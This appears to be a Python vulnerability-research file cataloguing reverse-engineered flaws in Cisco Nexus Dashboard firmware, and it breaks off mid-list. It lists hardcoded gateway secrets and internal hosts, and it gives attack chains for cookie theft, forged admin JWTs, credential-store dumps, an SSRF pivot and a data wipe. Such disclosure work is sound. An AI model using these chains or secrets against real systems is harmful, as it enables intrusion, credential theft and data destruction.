"""
Cisco Nexus Dashboard 3.2.2m — RE Module
Firmware: nd-dk9.3.2.2m.qcow2 / nd-dk9.3.2.2m.iso
Build date: 2025-07-14 (kube14, Jenkins CI)
Architecture: x86-64, Kubernetes cluster (K8s 1.27.7), OCI containers via stacker

Extraction method:
  qemu-nbd -> GPT: p2 EFI, p3 boot, p4 LVM (vg_ifc0), p5 ext4 unified-cargo
  vg_ifc0 LVs: certs(32MB), config(1GB), logs(2GB), ThinDataLV thin-pool (22.5GB)
  p5 unified-cargo -> firmware.iso (11GB squashfs) -> oci_repo/apic-sn/* (200+ OCI containers)

Container stack (atomix.yaml, 20 core + 200+ app containers):
  k8bins:       K8s 1.27.7 + etcd 3.3.15 + kubectl
  cni-plugins:  1.0.1.23 + BIRD BGP speaker
  kms:          Go binary (kms.bin) + etcd 3.3.15 — cluster PKI root
  keyhole:      Python Flask — SE node management API
  bootstrap:    Helm + K8s CRDs + CIMC provisioning expect scripts
  agent:        ND management agent
  falcon:       Security monitoring
  infra/etcd:   K8s etcd (separate from kms etcd)
  infra/kafka:  Kafka + ZooKeeper
  infra/mongodb: MongoDB + mongodb-exporter
  infra/opensearch: OpenSearch (ex-Elasticsearch)
  infra/apigw:  API gateway (JWT auth)
  infra/aaamgr/aaaserver: AAA authentication server
  apps/cisco-mso: 22 MSO microservices
  apps/cisco-ndfc: 32 NDFC (fabric controller) services
  apps/cisco-nir: 60+ NIR telemetry analysis services

Findings: ND-F01 (CRITICAL) through ND-F72 (MEDIUM).
  ND-F56 HIGH: CIMC creds + cluster passphrase as CLI argv — /proc/pid/cmdline exposure
  ND-F57 HIGH: CIMC SSH StrictHostKeyChecking=no — full bootstrap MITM surface
  ND-F58 HIGH: KexAlgorithms=+diffie-hellman-group1-sha1 — Logjam-vulnerable KEX fallback
  ND-F59 MEDIUM: curl --insecure for all Redfish BMC API calls
  ND-F60 HIGH: spm-lcm CGo GPGME key_secret/subkey_secret — private signing key extraction
  ND-F61 HIGH: spm-lcm contains firmwared code — enlarged blast radius (install/upgrade/kubectl)
  ND-F62 MEDIUM: spm-lcm signature verify pipeline — 4-stage crypto; private key bypass via ND-F60

Cross-version RE (3.2.2m -> 4.3.1, nd-dk9.4.3.1.175.iso, go1.25.8, Aug 21 2026):
  ND-F68 INFO:   ND-F64 FIXED — shell=True removed; findUsage now uses subprocess list form
  ND-F69 HIGH:   ND-F57 PARTIAL FIX — line 158 upgraded HostKeyAlgorithms to rsa-sha2-256/512;
                 line 229 (OOB path) still uses ssh-rsa; StrictHostKeyChecking=no persists both
  ND-F70 HIGH:   ND-F58 PERSISTS — KexAlgorithms=+diffie-hellman-group1-sha1 line 164 unchanged
  ND-F71 MEDIUM: firmwared extracted to standalone container in 4.3.1; spm-lcm now calls via API
                 (GPGME CGo bindings removed from spm-lcm — ND-F60 surface moved, not eliminated)
  ND-F72 MEDIUM: SECRETS path changed: /mnt/atom/logmgr/ -> /opt/cisco/logmgr/ (ND-F67 persists)
                 ND-F56/F58/F65/F66 persist unchanged across both versions
"""

import socket
import struct
import ssl
import json
import urllib.request
import urllib.parse
import os
import subprocess


# ─── Finding Metadata ───────────────────────────────────────────────────────

FINDINGS = {
    "ND-F01": {
        "title": "Keyhole World-Readable Admin Cookie — Filesystem Read = Full API Control",
        "severity": "CRITICAL",
        "component": "keyhole Flask server (keyhole_server.py)",
        "description": (
            "keyhole_server.py authenticates all requests via a shared cookie stored at "
            "/var/run/admin.cookie with chmod 644 (world-readable). The 15-character "
            "uppercase-ASCII cookie is generated with random.SystemRandom() then written "
            "world-readable: os.chmod(ADMIN_COOKIE, 0o644). Any process on the ND host "
            "with filesystem read access — including any container with a host volume "
            "mount — can read this file and gain full control of the keyhole API."
        ),
        "surface": "Flask REST API on SE nodes, port bound to local socket",
        "auth_mechanism": "?cookie= query param compared to /var/run/admin.cookie",
        "cookie_path": "/var/run/admin.cookie",
        "cookie_permissions": "0o644 (world-readable, root-owned)",
        "cookie_entropy": "26^15 ≈ 1.68e21 (uppercase ASCII, 15 chars)",
        "exposed_endpoints": [
            "GET /keyhole/api/v1/passphrase — returns SSH passphrase from /data/services/issh/token/passphrase",
            "GET /keyhole/api/v1/dbgtoken — returns debug challenge token",
            "GET /keyhole/api/v1/kubectl?args=<kubectl_args> — arbitrary kubectl with rescue-user cluster-admin kubeconfig (ND-F43)",
            "GET /keyhole/api/v1/reboot/<option> — reboots node (regular/clean/factory-reset)",
            "GET /keyhole/api/v1/shutdown — shuts down node",
            "GET /keyhole/api/v1/system-config — returns syscfg.yaml (node topology, minus admin_passwd)",
            "GET /keyhole/api/v1/show/cluster/json — K8s cluster node list",
            "GET /keyhole/api/v1/kafka/... — Kafka consumer group cleanup",
            "GET /keyhole/api/v1/techsupport — collect/clean tech support bundles",
            "GET /keyhole/api/v1/upgrade/update?filepath=&peer_password= — firmware update with arg injection (ND-F45)",
            "GET /keyhole/api/v1/ping?args= — unrestricted ICMP from ND node position (ND-F46)",
        ],
        "source_confirmed": "keyhole_server.py: writeAdminCookie() uses SystemRandom().choices(string.ascii_uppercase, k=15); os.chmod(ADMIN_COOKIE, 0o644)",
        "server_port": 30020,
        "server_tls": False,
        "lateral_path": (
            "Container escape OR any mounted host volume read -> cat /var/run/admin.cookie "
            "-> call /keyhole/api/v1/passphrase -> SSH passphrase for node "
            "-> call /keyhole/api/v1/show/cluster/json -> K8s ServiceAccount token path"
        ),
    },
    "ND-F02": {
        "title": "Keyhole Passphrase and Debug Token Endpoints — Direct SSH Credential Disclosure",
        "severity": "CRITICAL",
        "component": "keyhole_server.py /api/v1/passphrase + /api/v1/dbgtoken",
        "description": (
            "The keyhole Flask server exposes two endpoints that return live SSH credentials "
            "behind only the world-readable admin cookie (see ND-F01). "
            "/keyhole/api/v1/passphrase returns the contents of "
            "/data/services/issh/token/passphrase — the passphrase used to unlock the "
            "ifc_admin SSH key. /keyhole/api/v1/dbgtoken returns the challenge plugin "
            "token from /data/services/issh/token/challenge.plugin. "
            "keyhole_server.py logs filter these endpoints (SensitiveFilter class strips "
            "/api/v1/passwd and /api/v1/rma from werkzeug logs) but /passphrase and "
            "/dbgtoken are not filtered — responses appear in keyhole.log."
        ),
        "passphrase_path": "/data/services/issh/token/passphrase",
        "dbgtoken_path": "/data/services/issh/token/challenge.plugin",
        "shadow_path": "/data/services/issh/token/ifc_admin.shadow",
        "rescue_user_kubeconfig": "/home/rescue-user/.kube/config",
        "chain": "ND-F01 cookie read -> passphrase endpoint -> SSH node access -> K8s cluster control",
    },
    "ND-F03": {
        "title": "etcd 3.3.15 Backs KMS — Auth Bypass CVEs Against Platform PKI Root",
        "severity": "CRITICAL",
        "component": "kms container: etcd 3.3.15 (2019), kms.bin Go binary",
        "description": (
            "The Nexus Dashboard Key Management Service (kms.bin) uses etcd 3.3.15 as its "
            "backing store for ALL service private keys across the entire cluster. "
            "etcd 3.3.15 (released January 2020) has two critical auth bypass CVEs: "
            "CVE-2020-15115 (no password length enforcement, allows brute-force) and "
            "CVE-2021-28235 (unauthenticated key read/write via crafted /auth/token/revoke). "
            "start-kms.sh does not configure etcd auth (no etcdctl auth enable, no root "
            "user creation visible in startup script). etcd binds to non-default ports "
            "3379/3380 (obscurity, not security). "
            "kms.bin listens on :7777 (gRPC mTLS), :9989 (external TLS), :9969 (internal TLS). "
            "GODEBUG=x509sha1=1 is set — all certificates use SHA1."
        ),
        "etcd_version": "3.3.15 (2020-01-24, Go 1.12.9)",
        "etcd_ports": "3379 (client), 3380 (peer) — non-default",
        "kms_ports": "7777 (gRPC), 9989 (external TLS), 9969 (internal TLS)",
        "kms_binary": "kms.bin Go PIE ELF64, stripped, BuildID LYhJoTvCDDsu2q9q_uOv/...",
        "cve": ["CVE-2020-15115", "CVE-2021-28235"],
        "godebug": "x509sha1=1 — SHA1 certificates throughout KMS",
        "impact": (
            "etcd compromise = read all KMS stored keys = exfiltrate private keys for "
            "Kubernetes, Kafka, OpenSearch, MongoDB, apigw, firmwared, confd, aaamgr, "
            "aaaserver, eventmgr, all MSO/NDFC/NIR service mTLS certs (80+ certificate entries "
            "in platformgencertlocations.yaml). Full cluster mTLS collapse."
        ),
        "sam_config": {
            "sslConfigPath": "/ssl/",
            "sslCaCertPath": "/cacerts/",
            "portOffset": 12007,
            "logDirectory": "/data/log",
            "networkConnectTimeout": 500,
        },
        "app_users": [
            {"service": "Cisco_NIR", "cn": "Cisco_SN_NIR", "privilege": "all/admin/"},
            {"service": "Cisco_NIA", "cn": "Cisco_SN_NIA", "privilege": "all/admin/"},
            {"service": "Cisco_IntersightDC", "cn": "Cisco_SN_IntersightDC", "privilege": "all/admin/"},
        ],
    },
    "ND-F04": {
        "title": "genappcerts.sh — 20-Year Self-Signed RSA Certs, No SAN, SHA1 Forced",
        "severity": "HIGH",
        "component": "kms container: genappcerts.sh + appusers.yaml",
        "description": (
            "genappcerts.sh generates app-user certificates using: "
            "openssl genrsa -out <key> 2048 && "
            "openssl req -new -days 7300 -nodes -x509 -key <key> -subj '/C=US/ST=CA/O=Cisco Systems/CN=<cn>' "
            "-out <cert>. Issues: (1) self-signed (-x509 flag, no CA signing), "
            "(2) 20-year validity (7300 days), (3) no SAN extension, "
            "(4) CN-only hostname binding (deprecated, RFC 6125 non-compliant). "
            "All three app users are granted ciscoAvPair: all/admin/ — platform admin. "
            "GODEBUG=x509sha1=1 in start-kms.sh overrides Go's SHA1 deprecation for all "
            "certificate operations in the kms container."
        ),
        "cert_validity_days": 7300,
        "cert_type": "RSA 2048-bit self-signed",
        "san": "None — CN only",
        "app_cert_path": "/securedata/certs/v1/apps/<service>/",
        "chain": "ND-F03 etcd bypass -> read securedata -> exfiltrate app-user private keys -> platform admin",
    },
    "ND-F05": {
        "title": "rescue-user K8s ServiceAccount Pre-Provisioned With Cluster-Wide Read Access",
        "severity": "HIGH",
        "component": "bootstrap container: configs/rescue-user/rescue-user.yaml",
        "description": (
            "Every ND cluster provisions a rescue-user Kubernetes ServiceAccount "
            "with a ClusterRoleBinding granting read access to: "
            "endpoints, services, pods, pods/log, namespaces, deployments, jobs, nodes, "
            "apps, events, firmwares, leases, all, releases, lifecycles, servicepackages, "
            "customresourcedefinitions (apiGroups: core, extensions, apps, batch, "
            "case.cncf.io, metrics.k8s.io). "
            "The token secret (rescue-user-token) is referenced in keyhole_server.py at "
            "RESCUE_USER_CONFIG = /home/rescue-user/.kube/config. "
            "Combined with ND-F01+F02: keyhole cookie -> SSH access -> kubeconfig -> "
            "K8s cluster enumeration as rescue-user."
        ),
        "namespace": "rescue-user",
        "service_account": "rescue-user",
        "token_secret": "rescue-user-token (kubernetes.io/service-account-token)",
        "cluster_role": "system:rescue-user (cluster-wide read on core resources + case.cncf.io CRDs)",
        "kubeconfig_path": "/home/rescue-user/.kube/config",
    },
    "ND-F06": {
        "title": "OCI Image Annotations Embed Full CI Pipeline — SSH Keys, Internal Hosts, Proxy",
        "severity": "HIGH",
        "component": "All OCI image manifests (stacker YAML in io.stackeroci.stacker.stacker_yaml annotation)",
        "description": (
            "Every OCI container image in the ND image store includes a "
            "io.stackeroci.stacker.stacker_yaml annotation containing the complete CI build "
            "script used to produce that layer. These annotations expose: "
            "(1) SSH key path used during build: "
            "secretFiles/23cd94a3-27bb-4cc2-a11d-97b6cfccb652/ssh-key-GH_SSH_KEY "
            "(referenced in both uiassets and bootstrap build configs); "
            "(2) Internal container registries: aci-docker-reg.cisco.com, aci-zot.cisco.com:5000; "
            "(3) Internal artifact repositories: aci-artifactory-001.insieme.local:8081, "
            "devops-centos7-atom1.insieme.local:8081; "
            "(4) Internal Git server: aci-github.cisco.com; "
            "(5) Corporate HTTP proxy: insbulab-proxy.insieme.local:8080; "
            "(6) Build host: kube14, CI: Jenkins RELEASE_ND_CORE_INTEGRATION; "
            "(7) StrictHostKeyChecking=no in all git SSH operations."
        ),
        "exposed_assets": [
            "SSH key ID: 23cd94a3-27bb-4cc2-a11d-97b6cfccb652/ssh-key-GH_SSH_KEY",
            "Container registry: aci-docker-reg.cisco.com",
            "OCI registry: aci-zot.cisco.com:5000",
            "Artifactory: aci-artifactory-001.insieme.local:8081",
            "NPM registry: devops-centos7-atom1.insieme.local:8081",
            "Git server: aci-github.cisco.com",
            "HTTP proxy: insbulab-proxy.insieme.local:8080",
            "Build host: kube14",
        ],
        "build_path": "/home/jenkins/agent/workspace/Production/ND/ND_RELEASE/RELEASE_ND_CORE_INTEGRATION/",
        "retrieval": "squashfs-root/oci_repo/apic-sn/<service>/blobs/sha256/<manifest-hash>",
    },
    "ND-F07": {
        "title": "Component Version Inventory — K8s 1.27.7 (EOL), CRI-O 1.18.4, React 16, etcd 3.3.15",
        "severity": "HIGH",
        "component": "atomix.yaml layer manifest + OCI config blobs",
        "description": (
            "Version inventory from atomix.yaml and OCI image configs: "
            "Kubernetes 1.27.7.27 (EOL April 2024; CVE-2023-5528 node filesystem escape via hostPath); "
            "CRI-O 1.18.4.18 (2021, 5 years behind, multiple unpatched CVEs); "
            "etcd 3.3.15 in KMS (see ND-F03); "
            "React 16.13.1 (EOL April 2022) in management UI; "
            "Node.js 14.18.1 (EOL April 2023) used in UI build; "
            "Helm v3.13.3 in bootstrap; "
            "BIRD BGP speaker with hardcoded templates for ACI spine connectivity; "
            "MongoDB (version in app-mongodb container, not yet extracted); "
            "OpenSearch (formerly Elasticsearch; version not extracted — requires infra/opensearch container image inspection)."
        ),
        "versions": {
            "kubernetes": "1.27.7.27 (EOL 2024-04)",
            "cri_o": "1.18.4.18 (2021)",
            "etcd_kms": "3.3.15 (2020)",
            "react": "16.13.1 (EOL 2022)",
            "nodejs_build": "14.18.1 (EOL 2023)",
            "helm": "v3.13.3",
            "kafka": "see infra/kafka container",
            "zookeeper": "see infra/zk container",
        },
        "cve_surface": [
            "CVE-2023-5528: K8s hostPath volume node filesystem escape (CVSS 7.2)",
            "CVE-2020-15115 / CVE-2021-28235: etcd 3.3.15 auth bypass",
        ],
    },
    "ND-F08": {
        "title": "keyhole Inter-Service TLS verify=False — MITM on firmwared Communication",
        "severity": "MEDIUM",
        "component": "keyhole_server.py get_deployment_mode()",
        "description": (
            "keyhole_server.py calls the firmwared service with TLS verification disabled: "
            "requests.get('https://firmwared.firmwared.svc/api/v1/deployment', verify=False). "
            "If the cluster network is compromised (e.g., CNI/BGP speaker poisoning via "
            "BIRD template injection or K8s service re-routing), an attacker can intercept "
            "and modify deployment mode responses. firmwared controls firmware update state "
            "for all physical ND nodes — a MITM response could redirect firmware update "
            "targets or suppress firmware update operations."
        ),
        "affected_function": "get_deployment_mode() -> requests.get(url, verify=False)",
        "target_service": "firmwared.firmwared.svc",
        "impact": "Deployment mode spoofing; firmware update misdirection",
        "chain": "CNI/BGP poisoning -> MITM firmwared -> malicious deployment mode",
    },
    "ND-F09": {
        "title": "acs Admin CLI Leaks Credentials as URL Query Parameters — Logged Unredacted",
        "severity": "HIGH",
        "component": "acs Python admin shell (/usr/bin/acs in loginsh container)",
        "description": (
            "The acs admin CLI constructs keyhole API URLs with credentials embedded as "
            "GET query parameters, not POST bodies or headers. Three credential types exposed: "
            "(1) acs rma: /keyhole/api/v1/rma?controllerip=<ip>&controlleruser=<user>&controllerpsw=<cimc_password> "
            "— CIMC/iDRAC BMC password in URL; "
            "(2) acs upgrade update: /keyhole/api/v1/upgrade/update?filepath=<path>&peer_password=<nd_admin_password> "
            "— ND admin password in URL; peer_password is NOT in keyhole's SensitiveFilter "
            "class (which only strips /api/v1/passwd and /api/v1/rma), so it appears "
            "unredacted in keyhole.log on every upgrade; "
            "(3) acs node-join: /keyhole/api/v1/nodejoin?passphrase=<passphrase> "
            "— cluster join passphrase in URL. "
            "Additionally, acs kubectl proxies kubectl commands: "
            "/keyhole/api/v1/kubectl?args=<cmd> allows kubectl execution on the ND node "
            "authenticated only by the world-readable cookie (ND-F01)."
        ),
        "affected_commands": {
            "acs rma": "/keyhole/api/v1/rma?controllerip={}&controlleruser={}&controllerpsw={}",
            "acs upgrade update": "/keyhole/api/v1/upgrade/update?filepath={}&peer_password={}",
            "acs node-join": "/keyhole/api/v1/nodejoin?passphrase={}",
            "acs kubectl": "/keyhole/api/v1/kubectl?args={}",
        },
        "logging_gap": "peer_password not in SensitiveFilter — logged unredacted in keyhole.log",
        "keyhole_sensitive_filter": ["api/v1/passwd", "api/v1/rma"],
        "filepath_schemes": ["file://", "http://", "https://", "peer://NODE_IP"],
        "chain": "ND-F01 cookie + keyhole.log read -> exfiltrate ND admin password, CIMC password, join passphrase",
    },
    "ND-F10": {
        "title": "aaaserver TrustedJWTKeys Injection — Forge Admin JWT for Cluster-Wide Auth Bypass",
        "severity": "CRITICAL",
        "component": "aaaserver REST API (0.0.0.0:7770 HTTPS), resource aaa/v4.TrustedJWTKeys",
        "description": (
            "aaaserver exposes a TrustedJWTKeys resource via REST (POST/PUT) that allows "
            "injection of attacker-controlled RSA public keys as trusted JWT signing anchors. "
            "aaaserver_config.json lists 'aaa/v4.TrustedJWTKeys' with methods POST and PUT "
            "permitted. An attacker who can reach aaaserver:7770 (reachable from within the "
            "cluster, or with mTLS cert from ND-F03) can POST their own public key as a "
            "TrustedJWTKey, then sign JWTs with the corresponding private key and "
            "claim arbitrary privileges (ciscoAvPair: all/admin/). "
            "The aaaserver config shows Kafka topic publishing to kafka-svc.kafka:9092 (mTLS) "
            "and MongoDB on mongodb.mongodb.svc:27017 (TLS) — injected keys persist across restarts. "
            "aaaserver is ND's AAA root — all Kubernetes RBAC and ND API JWT validation flows "
            "through it."
        ),
        "endpoint": "POST|PUT https://aaaserver:7770/aaa/v4/TrustedJWTKeys",
        "aaaserver_config": {
            "rest_port": 7770,
            "rest_bind": "0.0.0.0",
            "tls": True,
            "kafka": "kafka-svc.kafka:9092 (mTLS)",
            "mongodb": "mongodb.mongodb.svc:27017 (TLS)",
        },
        "attack": (
            "1. Generate RSA-2048 keypair (openssl genrsa); "
            "2. POST public key to /aaa/v4/TrustedJWTKeys authenticated via mTLS cert (from ND-F03) "
            "or cluster-internal access; "
            "3. Craft JWT: sub=<any-user>, ciscoAvPair=all/admin/, sign with private key; "
            "4. Present JWT to any ND API endpoint -> full admin access"
        ),
        "chain": "ND-F03 etcd bypass -> app-user cert exfiltration -> POST TrustedJWTKey -> forge admin JWT",
    },
    "ND-F11": {
        "title": "apigw Tyk Default Admin Secret + Hardcoded API Key — Full Gateway Control",
        "severity": "HIGH",
        "component": "infra/apigw — Tyk API Gateway 2.x",
        "description": (
            "The Nexus Dashboard API gateway uses Tyk with the unchanged factory-default "
            "admin secret across all three shipped configuration files "
            "(tyk.conf.example, tyk.self_contained.conf, tyk.with_dash.conf): "
            "secret = '352d20ee67be67f6340b4c0605b044b7'. "
            "This is the well-known Tyk default, documented in public CVE disclosures. "
            "A second hardcoded credential: jwt_api.key = '98762936529610954627283496573984' "
            "is stored in the OCI image at /opt/tyk-gateway/jwt_api.key. "
            "With the admin secret, an attacker can: create/delete API keys, "
            "modify API definitions, add policies, and inject new APIs via "
            "POST /tyk/apis (x-tyk-authorization: 352d20ee67be67f6340b4c0605b044b7). "
            "The apigw container has 17 custom Go .so middleware plugins "
            "(login_handler, msologin, oidccallback, otp, certlogin, authcheck, denyrole, "
            "etc.) — each plugin is an independent auth bypass surface in the gateway pipeline."
        ),
        "tyk_admin_secret": "352d20ee67be67f6340b4c0605b044b7",
        "jwt_api_key": "98762936529610954627283496573984",
        "org_id_hardcoded": "436973636f204150494320414141",
        "org_id_decoded": "Cisco APIC AAA",
        "custom_plugins": [
            "login_handler.so", "certlogin_handler.so", "logout_handler.so",
            "refresh_handler.so", "header_handler.so", "k8header_handler.so",
            "msologin.so", "authcheck_handler.so", "whoami_handler.so",
            "launch_handler.so", "otp_handler.so", "oidccallback_handler.so",
            "token_handler.so", "health_handler.so", "changepassword_handler.so",
            "denyrole.so", "denyhttpmethods_handler.so", "xlaunch_handler.so",
        ],
        "tyk_admin_api": "POST /tyk/apis, GET /tyk/keys, DELETE /tyk/keys/<key-id>",
        "chain": "network access to apigw -> POST /tyk/apis with default secret -> inject open policy -> bypass all ND auth",
    },
    "ND-F12": {
        "title": "firmwared Dual Signing Key Architecture — Dev Key in Prod Image + SSRF via peer://",
        "severity": "HIGH",
        "component": "firmwared Go binary + firmwared-config.json + acs upgrade command",
        "description": (
            "firmwared uses PKCS1v15 RSA-2048 signature verification against two embedded "
            "public keys: AbraxasACI.pem (production firmware signing key) and "
            "AbraxasACIDev.pem (development signing key). The development key is present "
            "in the production firmware image (3.2.2m), creating a second trusted signing "
            "anchor with an unknown-custody private key. "
            "firmwared exposes /api/v1/firmware/upload for direct firmware blob upload "
            "on port 443 (TLS), accessible from ND-internal services. "
            "SSRF: the acs upgrade update command accepts filepath=peer://NODE_IP, causing "
            "firmwared to initiate an outbound connection to the specified IP — usable for "
            "internal network discovery and SSRF against cluster-internal services. "
            "firmwared uses etcd v3 for state storage and containers/ocicrypt for "
            "AES-256-GCM layer encryption of OCI firmware blobs."
        ),
        "abraxas_aci_pem": (
            "-----BEGIN PUBLIC KEY-----\n"
            "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0Byzms13j1UY/5eV/kDw\n"
            "AuIUUViKLeL6Vth58sN6MFk6b5gjBZHPlvtzljNFIS++xsqi63V4iVwYGxD/OC2O\n"
            "mNUAHnY1z+IKSjh5xAwCUTj44KCyMslbiCNPDLN3uuPb8z+1BwQJ1a04mnoRsmRo\n"
            "dQOiXLJGNxTofUW7zI0UDK7L3+2zZnbUWgvZsrLW/GVeAKZBMw9D073i4cnpO60O\n"
            "477aWKP9yjAMs3koqtfFnWVRPwPEjZu7ZVR9z2t7QWb4+vT98GwCoNiWpdSRXmrS\n"
            "bMbBiOeq6XAUN3jEmNfbw7dvn5DDY1PjQxjRccbtMOHIk+ivqxj5spKYEt4b0eDP\n"
            "QwIDAQAB\n"
            "-----END PUBLIC KEY-----"
        ),
        "abraxas_aci_dev_pem": (
            "-----BEGIN PUBLIC KEY-----\n"
            "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA60ymvh7yo2nJgLDJJ6HS\n"
            "2kDlVg51syBc6nmVTTBZDKyMYeIUZ5NDEIiLjSSXD+Bqcz2t2t9BkVGgO1UhMkyz\n"
            "zO/Xe3aeRfSZBRaHl1jDQ7k6/r/ASefwa6pe35PvFjljiqj+9kYliXJv87Igb4g7\n"
            "IhEA/60XAWvqFamXwQ07dD+iSB7XPYhptYtkz8fp0Tp/miwJvd08TkHGBOuUV3Ea\n"
            "xcoMeYgWI9yNdoZAiFzGXZM/HoviLaSfxUACW4GL4STWOEmy3hniZInk1HJIEsQN\n"
            "qyO6qNiVjPKxyO70twxmUY3kC6wY64k32gU6AA0iFmwcfDNmUX3ZArIBAbxx3aaI\n"
            "zQIDAQAB\n"
            "-----END PUBLIC KEY-----"
        ),
        "firmware_upload_endpoint": "POST /api/v1/firmware/upload (port 443, TLS)",
        "ssrf_vector": "acs upgrade update filepath=peer://ATTACKER_IP -> firmwared outbound connection",
        "encryption": "containers/ocicrypt AES-256-GCM layer encryption",
        "chain": "dev key present in prod -> unsigned dev builds accepted -> firmware replacement; peer:// SSRF -> internal pivot",
    },
    "ND-F13": {
        "title": "acs deployment clean-wipe — Destructive Wipe Protected Only by World-Readable Cookie",
        "severity": "MEDIUM",
        "component": "acs Python admin shell — deployment clean-wipe command",
        "description": (
            "The acs admin CLI exposes a deployment clean-wipe subcommand "
            "(acs deployment clean-wipe --service [ndi|ndfc|ndo]) that permanently deletes "
            "all application data and state for the specified service. "
            "The only access control is the world-readable admin.cookie (ND-F01). "
            "Any attacker who has obtained the cookie can destroy the entire ND data plane "
            "— all fabric management state, policy configurations, and operational history — "
            "with a single HTTP GET request to keyhole. No confirmation required, no RBAC, "
            "no audit trail beyond keyhole.log."
        ),
        "command": "acs deployment clean-wipe --service [ndi|ndfc|ndo]",
        "services_affected": ["ndi (Nexus Dashboard Insights)", "ndfc (Fabric Controller)", "ndo (Orchestrator)"],
        "access_control": "world-readable cookie only (ND-F01)",
        "chain": "ND-F01 cookie -> clean-wipe all services -> full operational data destruction",
    },
    "ND-F17": {
        "title": "securitymgr CA Passphrase Debug Endpoint — Cluster CA Key Decryption via GET",
        "severity": "CRITICAL",
        "component": "securitymgr binary (port 8989) + confd debug API (port 19999)",
        "description": (
            "securitymgr exposes the current CA certificate request passphrase via the "
            "confd debug API at GET /api/debug/passphraseresp. "
            "Response: SecmgrCAPassphraseResp { currCertReqPassphrase: '<passphrase>', "
            "currCertReqPassphraseExpiry: '<datetime>' }. "
            "This passphrase is used to decrypt/operate the ND cluster CA private key. "
            "With the CA passphrase, an attacker can: decrypt the CA private key from "
            "the KMS etcd store (ND-F03), issue arbitrary TLS certificates for any ND "
            "service, forge mTLS client certs for any cluster microservice, and MITM "
            "all inter-service TLS traffic. "
            "A second related endpoint: POST /api/debug/passphrase (SecmgrCAPassphraseReq) "
            "requests a fresh CA passphrase (reqID only), suggesting passphrase rotation "
            "is also debug-accessible. "
            "Additionally: GET /api/debug/ securitymgr token endpoint returns "
            "SecmgrTokenResp { caCert, currToken, oldToken, tokenExpiry } — "
            "the current CA certificate and active signing token."
        ),
        "endpoints": {
            "GET /api/debug/passphraseresp": "returns currCertReqPassphrase (CA key passphrase)",
            "POST /api/debug/passphrase": "request CA passphrase rotation; reqID only",
        },
        "response_fields": {
            "currCertReqPassphrase": "passphrase to decrypt CA private key",
            "currCertReqPassphraseExpiry": "expiry timestamp",
        },
        "securitymgr_port": 8989,
        "confd_debug_port": 19999,
        "chain": (
            "ND-F03 etcd bypass -> app-user mTLS cert -> confd debug API -> "
            "GET /api/debug/passphraseresp -> CA passphrase -> "
            "decrypt CA private key -> sign arbitrary certs for any cluster service -> "
            "full mTLS impersonation"
        ),
    },
    "ND-F18": {
        "title": "securitymgr Credential Store Dump — ACI/Nexus Device Passwords via Debug API",
        "severity": "CRITICAL",
        "component": "securitymgr + confd debug API, CredmsCredStore schema",
        "description": (
            "The credential store managed by securitymgr contains device credentials "
            "for all ACI APIC fabric controllers, Nexus switches, and managed sites "
            "that ND supervises. Three retrieval paths: "
            "(1) GET /api/debug/class/credentialstore — returns ALL credential stores; "
            "(2) GET /api/debug/dn/credentialstore/{owner} — get by owner (ACI site name); "
            "(3) POST /api/config/getcredentials — production path, retrieves by owner + reqID. "
            "Credential store structure (CredmsCredStore): "
            "{ owner: '<site-name>', components: { '<apic>': { credentials: "
            "{ 'username': '...', 'password': '...' }, sharedWith: [...] } }, updated: '<ts>' }. "
            "The components.credentials field is a Name/Value pair map — passwords are "
            "stored as credentials values. The securitymgr backend is MongoDB "
            "(mongodb.mongodb.svc:27017) — if MongoDB lacks auth (common in K8s-internal "
            "services), direct DB access also yields all credentials. "
            "ACI App User operations: POST /api/debug/acisiteappuser returns "
            "SecmgrACIAppUserResp { cert: '<X509 PEM>', key: '<PRIVATE KEY PEM>' } — "
            "securitymgr generates and RETURNS the private key for ACI app user certs."
        ),
        "endpoints": {
            "GET /api/debug/class/credentialstore": "dump all credential stores",
            "GET /api/debug/dn/credentialstore/{owner}": "get creds by ACI site owner",
            "POST /api/config/getcredentials": "retrieve specific device credentials",
            "POST /api/debug/acisiteappuser": "returns ACI app user cert + private key",
        },
        "credential_schema": {
            "owner": "ACI site / managed device name",
            "components.<device>.credentials": "Name/Value map with username/password",
            "components.<device>.sharedWith": "services granted access to these creds",
        },
        "backend": "MongoDB mongodb.mongodb.svc:27017",
        "chain": (
            "ND-F03 mTLS cert OR ND-F16 confd debug access -> "
            "GET /api/debug/class/credentialstore -> "
            "all ACI APIC admin passwords + Nexus fabric credentials -> "
            "lateral movement to ALL managed ACI fabrics and data center switches"
        ),
    },
    "ND-F15": {
        "title": "signdata: Snakeoil + Dev TPM/LUKS Signing Keys + Pre-Signed Production Hardware Policies",
        "severity": "CRITICAL",
        "component": "signdata OCI container (policy-2/ directory, 87 total policies)",
        "description": (
            "The signdata container ships 7 public keys across three trust tiers "
            "(release, dev, snakeoil) in ALL production ND firmware images. "
            "Alongside the 7 public keys are 87 pre-signed TPM authorization policies "
            "organized by PCR hash measurement. Policy categories by key:key_type: "
            "snakeoil:production (4 entries for m6, qemu, ucs-c225m6-huu-4.2.2f), "
            "snakeoil:password (4), snakeoil:limited (4), "
            "dev:production (14 entries for UCS C225M6, QEMU, shim variants), "
            "dev:password (14), dev:limited (11), "
            "release:production (11), release:password (11), release:limited (14). "
            "Key finding: snakeoil-signed TPM policies are pre-authorized for physical "
            "UCS C225M6 hardware (ucs-c225m6-huu-4.2.2f, m6). The snakeoil and dev "
            "public keys are in the trusted keychain — any firmware signed with the "
            "corresponding snakeoil/dev private keys (likely in Cisco CI systems reachable "
            "via ND-F06) will be accepted by production hardware. "
            "info.json entries for dev:production hardware include: "
            "'RELrelease-on-DEVprovisioned-ucs-c225m6-4.2.2a' — production ND releases "
            "installed on hardware provisioned in dev mode accept dev-signed policies. "
            "This combines with ND-F12 (AbraxasACIDev key in firmwared) to form a pattern: "
            "Cisco ships dev/test signing keys across all firmware signing subsystems."
        ),
        "public_keys": {
            "luks-release.pem": "RSA-2048 prod LUKS unlock key",
            "tpmpass-release.pem": "RSA-2048 prod TPM passphrase key",
            "luks-dev.pem": "RSA-2048 dev LUKS unlock key (in prod image)",
            "tpmpass-dev.pem": "RSA-2048 dev TPM passphrase key (in prod image)",
            "luks-snakeoil.pem": "RSA-2048 snakeoil LUKS key (in prod image)",
            "tpmpass-snakeoil.pem": "RSA-2048 snakeoil TPM key (in prod image)",
        },
        "snakeoil_production_targets": [
            "m6 (UCS C225M6 hardware)",
